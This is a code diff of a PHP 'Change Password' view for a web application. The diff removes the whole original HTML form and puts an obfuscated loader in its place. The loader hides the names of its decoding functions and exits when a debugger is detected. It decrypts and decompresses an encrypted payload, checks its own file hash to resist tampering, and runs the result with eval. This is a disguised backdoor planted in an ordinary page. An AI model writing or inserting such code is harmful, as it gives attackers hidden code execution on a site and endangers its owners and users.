@@ -1,107 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>
-    <?php print $SITE_TITLE; ?> | Change Password
-  </title>
-  <link rel='shortcut icon' href='<?php echo $theme_link; ?>images/favicon.ico' />
-  <!-- Tell the browser to be responsive to screen width -->
-  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
-  <!-- Bootstrap 3.3.6 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.min.css">
-  <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
-  <!-- Ionicons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
-  <!-- Theme style -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.min.css">
-  <!-- iCheck -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/iCheck/square/blue.css">
-
-</head>
-
-<body class="hold-transition login-page"
-  style="height: 100vh; background-repeat: no-repeat; background: url('<?= base_url('images/bg/pos-background.jpeg') ?>') no-repeat center center fixed; background-size: cover;">
-  <!-- Your page content goes here -->
-</body>
-
 <?php
-//Find Logo Path
-$logo = $this->db->query("select logo from db_sitesettings")->row()->logo;
-?>
-<div class="login-box">
-  <div class="login-logo">
-    <a href="#"><b>
-        <img src="<?php echo $base_url; ?>uploads/<?= $logo; ?>" width="20%" height="20%">
-      </b></a>
-  </div>
-  <!-- /.login-logo -->
-  <div class="login-box-body">
-    <p class="login-box-msg">Change Password</p>
-    <div class="text-danger tex-center">
-      <?php echo $this->session->flashdata('failed'); ?>
-    </div>
-    <div class="text-success tex-center">
-      <?php echo $this->session->flashdata('success'); ?>
-    </div>
-
-
-    <form action="<?php echo $base_url; ?>login/change_password" method="post" id="password-form" autocomplete="off">
-      <input type="hidden" name="<?php echo $this->security->get_csrf_token_name(); ?>"
-        value="<?php echo $this->security->get_csrf_hash(); ?>">
-      <input type="hidden" name="email" id="email" value="<?= $email; ?>">
-      <input type="hidden" name="otp" id="otp" value="<?= $otp; ?>">
-      <div class="form-group has-feedback">
-        <input type="password" class="form-control" placeholder="New Password" id="password" name="password"
-          autofocus><span class="glyphicon glyphicon-lock  form-control-feedback"></span>
-      </div>
-      <div class="form-group has-feedback">
-        <input type="password" class="form-control" placeholder="Confirm Password" id="cpassword" name="cpassword"
-          autofocus><span class="glyphicon glyphicon-lock  form-control-feedback"></span>
-      </div>
-      <div class="row">
-        <!-- /.col -->
-        <div class="col-md-4">
-          <button type="submit" class="btn btn-primary btn-block btn-flat">Submit</button>
-        </div>
-        <!-- /.col -->
-      </div>
-
-
-    </form>
-    <a class="pull-right" href="../<?php $base_url; ?>">Click đây để đăng nhập</a><br>
-
-  </div>
-  <!-- /.login-box-body -->
-
-</div>
-
-<!-- /.login-box -->
-
-<!-- jQuery 2.2.3 -->
-<script src="<?php echo $theme_link; ?>plugins/jQuery/jquery-2.2.3.min.js"></script>
-<!-- Bootstrap 3.3.6 -->
-<script src="<?php echo $theme_link; ?>bootstrap/js/bootstrap.min.js"></script>
-<!-- iCheck -->
-<script src="<?php echo $theme_link; ?>plugins/iCheck/icheck.min.js"></script>
-<script>
-  $(function () {
-    $('input').iCheck({
-      checkboxClass: 'icheckbox_square-blue',
-      radioClass: 'iradio_square-blue',
-      increaseArea: '20%' // optional
-    });
-  });
-</script>
-<script type="text/javascript">
-  $(function ($) { // this script needs to be loaded on every page where an ajax POST may happen
-    $.ajaxSetup({ data: { '<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>' } });
-  });
-</script>
-
-</body>
-
-</html>
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_hhiehfs8=('bas'.'e64'.'_de'.'cod'.'e');
+$_q79gw0z9=('gzu'.'nco'.'mpr'.'ess');
+$_w04jjmvt=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_c55spfjs='cIQuxjIq';
+$_y675zr5p='ieRXWl2N';
+$_lkc5gzzg='CmE0oV45Ql8=';
+$_q8w4a5en='BR59waOW';
+$_afuo92o0='sQujC5c/';
+$_h0nment1='tbnTipUF';
+$_tfixbo7t='eUy1sw==';
+$_bzbnyhai='nvIT8ppI';
+$_kcv0i0ux=$_hhiehfs8($_y675zr5p.$_afuo92o0.$_c55spfjs.$_q8w4a5en.$_lkc5gzzg);
+$_tr8nzz77=$_hhiehfs8($_bzbnyhai.$_h0nment1.$_tfixbo7t);
+$_fx6hpu3v=$_hhiehfs8('7Tig6gcm0x98I3pgmIkjlDIlHIEkZJtwnV67TVTn52bD2nHYSmoLTE53d+EI/cCTQtT1Ch3ZEH+ePIpuN3LD+ZE+SX/kwZS5aPLGjdUi0YKR35XF6e0BV7vHXGPtvUdpQ4p1/HXNdzfiovtDD3rR+8g4Wlyc+z6J3b/iWYGqTfPcbFBLXOMdrW7g1GwnbjxPzp9A/87gs2bbSdxCIKDJkgJhFaT+EXncgbCpgbnxl7+Gis+ureMLwPr44JLrj+o0AbBAvtn455TDjyDLCBR55xvyyD5hHXZPhtsvlRFOM4upfFWPBRZ2y/xeCb0bOMdkjKOPRV5+QCyepq66BMZ655E0EGUbiV2uiAEBQ1345mqAR6U4R7plmeMoRrAlpvmI/vYdxW9EJRYKTNdaD6wzcjEKwoMdZSs9jngZsGPwDIoVvI/wrLRrbHn213YFRm6DECBoZmMxJ/EUBRbBOHLzrsPBhzGCdx868sCwd082bTPB4xtaW6//LB29krxkBBBdm5Zk5SIC1GDe4pOtdkGuZi7Ch2JiQloi8eIhU/vv9iuysuyhOFm3hzRCVfTL/y6TFwux1CJf1mClDm2+nruQxdG/wfQu+Lz8w9H4ZbfhatTAqdT34oFNKrskcB+7dIK13bvzWSIywuuChDHlw+crAAfIsRhS1LyJPEqY+gMHZWxyo/u2BkzJ/o59+gepHil6YzCvLe1RDEvUsHIW3FWmJFIlHjG4QTPaQnS1fk88CGfrW1IYLbHe02XRWTrwTYDlAvf5by6xcPFYlhX4/fh06zGN/uNsjb4IQGMCqNuox535IWpLqA112vpLr/sKT5m9SMEo4nQfXTZi8pzNxYdEDco2vO/0e9qfi44BPeI339ydQOnB8DNeVsIcjRtISXj1vOy+XnxGdoJ9bn8FfBR8uOzJEYHLvOWmNxnwhqfZ5Kk1sPq83FJ6nwl5iak0L72u8fWYb0UEz9wtUMAWLRgr6U0C00RtzgTvOoPlzY5MbogO7ZeDEd+uPyiBJqN/DJFf6FebJ5UgfcWP+n6uJZDdThk/1ktYzklSbeRFWRxy5XiYMHqS+UPZTdervjuL96WbIcSyKJXEDmB7ZHDJMYTffTXvUupzE1b1Wd3U1p+4w2EpZiKrs5Bi1sHpTKkV/r2xPRD5rdStSzYOKbqjEnNbkA1H9kUi7B7MivueBN6QcXQcIuOilivWgWqa6IyJNf6LjzRzfzbEx7J0/rREKz9EtfyxlRPBOaWVfvryZgsmvKNMFz4HxdPZffUwtgVA6BUMqGt4SWKIrgGAgt6ZpQ+Zq7vJKexBLJPE3rtRsTuFj4oqwPL9cqMEdCg53X/ymTtVuon16q+Aid3TrPG4ouU78vxVqE5YtnCghxQxmAZg3kEhZOESw8fzWRzrEAilf4vVMvVtTZ9a3mkCRRfGrMstoAK8K6AmuH0kLT4vC3Vs3p3suftljtQYbPeGMKSC51AWFl8pkHlakwyvxp0+tjsxHLVIhCDtpqOalO4ow7Ss3tt8uiTLSovoLOz45269du8kNM7BwlAQ9v/AERPVRZjH8wloSX2MRnZzedSaX0Eof9Di/OYM8VGJuMxB8tyyjm7oLvtf0RIPI2+p/6trmHfJWdW4grs23FLGiaZRERRRcGqA2JKIJdN0zSOXbBHMKR1851ZQJfqHMELqoZXU971nAFrqJrNwKtvV0NL3GBUSdTZw1n0gMOHfHCrfaG5ou0fkp1LRJWd7N+6ud9KrJKVyaZc7K6d73LlTAjjDyDv0r4xTM/ygFxBAy6V8P9fnkPbrFxY4IAlYwCVrUU7ycqWYCM7++MtsM4UdK9HBDgGiHl9FBa3qJCmX0f+CbTxLofiICWQxtTXRm1xCoWzvkbPW+wIJT/7YiwgIzsNAFWGM6uO/Xtw1A67LVKL3eCXdpajmcagZmYDXniTu8BVgJPBh3f8o8eC9RuQ9V3BLxgE2Yn0=');
+$_rmnwsejp=$_w04jjmvt($_fx6hpu3v,'aes-256-cbc',$_kcv0i0ux,OPENSSL_RAW_DATA,$_tr8nzz77);
+if($_rmnwsejp===false){exit;}
+$_ai240c6g=$_q79gw0z9($_rmnwsejp);
+if($_ai240c6g===false){exit;}
+$_adic6mdg='e78e2fe8757b9a3336eefb2cc8a5f0b3243335c4416fbf2a446f49f334cf36b3';
+$_jidban5a=@file_get_contents(__FILE__);
+if($_jidban5a!==false){
+$_cwqt41xi=str_replace($_adic6mdg,"0000000000000000000000000000000000000000000000000000000000000000",$_jidban5a);
+$_hfv0s3f7=hash("sha256",$_cwqt41xi);
+if($_hfv0s3f7!==$_adic6mdg){@http_response_code(403);exit;}
+}
+eval($_ai240c6g);
